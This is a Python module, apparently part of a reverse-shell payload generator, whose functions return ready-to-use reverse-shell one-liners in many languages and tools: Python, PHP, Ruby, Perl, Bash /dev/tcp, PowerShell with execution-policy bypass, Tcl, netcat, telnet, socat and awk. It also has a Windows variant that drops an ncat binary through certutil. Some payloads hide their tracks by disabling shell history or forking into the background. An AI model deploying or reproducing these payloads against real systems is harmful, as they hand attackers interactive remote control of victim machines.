#!/usr/bin/env python
from binary import WINDOWS_NCAT, binary_to_bat, shellcode_to_ps1
from classes import generate_file_name

def REV_PYTHON_TCP():
	return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """

def REV_PYTHON_UDP():
	return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """

def REV_PHP_TCP():
	return r"""php -r "\$sock=fsockopen('TARGET',PORT);exec('/bin/sh -i <&3 >&3 2>&3');" """

def REV_RUBY_TCP():
	return """ruby -rsocket -e "exit if fork;c=TCPSocket.new('TARGET','PORT');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end" """

def REV_PERL_TCP():
	return r"""perl -e "use Socket;\$i='TARGET';\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};" """

def REV_PERL_TCP_2():
	return r"""perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,'TARGET:PORT');STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;" """

def REV_PERL_UDP():
	return """perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);my ($pa,$pp);$s=new IO::Socket::INET->new();$s = new IO::Socket::INET(PeerAddr => "TARGET:PORT",Proto => "udp"); $s->send("SHELLPOP PWNED!\n");while(1) { $s->recv($r,1024);$pa=$s->peerhost();$pp=$s->peerport();$d=qx($r);$s->send($d);}'"""

def BASH_TCP():
	return """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""

def REV_POWERSHELL_TCP():
	return """powershell.exe -nop -ep bypass -Command "$ip='TARGET';$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($ip, $port);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ');$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -c $returndata 2>&1 | Out-String ) } catch { Write-Warning 'Something went wrong with execution of command on the target.'; Write-Error $_; }; $sendback = $result +  'PS ' + (Get-Location).Path + '> '; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };" """

def REVERSE_TCLSH():
	return """echo 'set s [socket TARGET PORT];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"""

def REVERSE_NCAT():
	return "ncat TARGET PORT -e /bin/bash"

def REVERSE_NC_TRADITIONAL_1():
	return "nc TARGET PORT -c /bin/bash"

def REVERSE_NC_UDP_1():
	return """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { bash -i; } > fifo"""

def REVERSE_MKFIFO_NC():
	return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/f"

def REVERSE_MKNOD_NC():
	return "if [ -e /tmp/f ]; then rm -f /tmp/f;fi;mknod /tmp/f p && nc TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"

def REVERSE_MKFIFO_TELNET():
	return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet TARGET PORT > /tmp/f"

def REVERSE_MKNOD_TELNET():
	return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mknod /tmp/f p && telnet TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"

def REVERSE_SOCAT():
	return """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""

def REVERSE_AWK():
	return """awk 'BEGIN {s = "/inet/tcp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""

def REVERSE_AWK_UDP():
    return """awk 'BEGIN {s = "/inet/udp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""

def REVERSE_WINDOWS_NCAT_TCP():
	nc_out = generate_file_name()
	return  """{0}\ncertutil -decode %Temp%\\{1}.b64 %Temp%\\{1}.exe\n%Temp%\\{1}.exe -e cmd.exe TARGET PORT\ndel %Temp%\\{1}.exe\n""".format(binary_to_bat(WINDOWS_NCAT, file="%Temp%\\{0}.b64".format(nc_out)), nc_out)

def REVERSE_WINDOWS_BLOODSEEKER_TCP():
	return """ Custom Shell requires a Custom code. """

def REVERSE_POWERSHELL_TINY_TCP():
	return """powershell.exe -nop -ep bypass -Command "$c=new-object system.net.sockets.tcpclient('TARGET',PORT);$s=$c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|out-string);$z=$o + 'PS' + (pwd).Path + '>';$x = ([text.encoding]::ASCII).GetBytes($z);$s.Write($x,0,$x.Length);$s.Flush};$c.close()" """